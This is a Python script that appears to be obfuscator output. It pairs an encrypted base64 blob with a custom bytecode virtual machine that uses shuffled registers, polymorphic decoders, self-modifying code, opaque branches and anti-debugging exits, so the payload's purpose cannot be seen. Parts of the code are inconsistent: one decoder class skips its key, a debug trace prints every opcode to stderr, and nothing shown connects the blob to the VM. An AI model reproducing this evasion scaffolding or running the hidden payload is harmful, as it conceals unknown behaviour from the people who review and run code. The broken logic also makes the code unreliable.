#!/usr/bin/env python3
def _qylhczu(_glysegvp):
    return _glysegvp % 1204 + 1

import hashlib as _rklap, hmac as _ikrsgsxv, base64 as _dnsvivj, sys as _lwebje, zlib as _kwevyuzgg
_glysegvp = 105980
_zmkyjfcx = """IX5SZywxH5zDJ6uyHphdCVERaywiENr6luiOaNRqY27DYrk0VccOffklAX71K+vKmDT+z7FLrRDypxLCkSMV09PQ0vwoe6a7KSdEH5kFGPgKVRm+URqfgZwNRjYwoBFdEZarunVvx1rS+GULgevh5EWFlUKPE+W0v516FMQSwNT/lhsKXu1DM5q7GMrk4egL7SxmaDX05rh/KnsdOS6ZBI9Q1Ot6ZZE5ADuMidGtoWnNeYB2BxDejE8qrGDHeHXb5S97NgNbcwleGtHHGF7vwpZj0BBaWbcYXYX3oLGlyxOG9vqSHcq8MIpGHOrAdn5V/K0A5B/Of98big+RBU8DA1vPg7rCMA0PNGMsqBEb9J70V6Z/gwjXX+5/032k8GWr5skjey+/xtdK4pcWBh4jhNcnnqOcm6IGjSUze6omaevq1fJiz0STXhQ7+8G6WHyJyvv//2rYnV0sDVHrLoTvWIbaRLJe/SgOI07NqoZsg5pBTI9H5Em/cdxWutHkTgzz7EVOWGEpF86cccibgIv+1quHazpG3FV006zvkkE+juVywALL1GnoG1IPqY6t7RHL7MmI8/v772KQ+nUpSwU6f0IEuw8VTVqRt4eztJgo++mzvfSFlZqMfLoH83LeBstqGWBWqojyfvgVRG63G7Dg6BE5AOL5pqShKMeYwSGs6e6Iq0fpe251Ci7xS59fUb86e0KoOty5b5/MFB3pPov8VUXh0/WZKnO469kW7A+Y3RsRxxpoFvmmb4Ln4rv0q7a6kYCmmgm9IngBOcoF8ywrcRv4LlZ2un5nPMdx/Ky0oL5gOYnuHVjmjTd+YFCrs7WbWy6BN0X+l9mhUJai3US18xn8WqeY5oSqL/jOqbMAlrQrbjKaVamPldTcEWOhAQvB6aKWJk6pbip1TxS1fOm5J1N17U3c7Q=="""
_zhuirfh = 3
_lbrqroi = _qylhczu(_glysegvp)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    else:
        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
    _dbg_len = 0
    while _ip < _n:
        _cycle += 1
        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        if __debug__ and _dbg_len < 65:
            _opn = {0:'NOP',1:'LC',2:'LG',3:'SG',4:'LF',5:'SF',6:'MOV',10:'ADD',11:'SUB',12:'MUL',13:'DIV'}
            _on = _opn.get(_op, f'OP{_op}')
            _b_raw = _code[_ip] if _ip < len(_code) else -1
            _b_dec = _b_raw ^ _op_key[_ip % 32] if 0 <= _b_raw < 256 else -1
            _mval = _map[_b_dec] if 0 <= _b_dec < 256 else -1
            sys.stderr.write(f'  [{_ip:3d}] {_on:3s} rd={_rd:2d} rs1={_rs1:2d} rs2={_rs2:2d} imm={_imm:6d} [raw={_b_raw:3d} dec={_b_dec:3d}→map→{_mval:2d}]\n')
            _dbg_len += 1
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _pos = 256
    _flags = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _joivy():
    if _lwebje.gettrace() is not None:
        _lwebje.stderr.write('error: debugger detected\n'); _lwebje.exit(1)
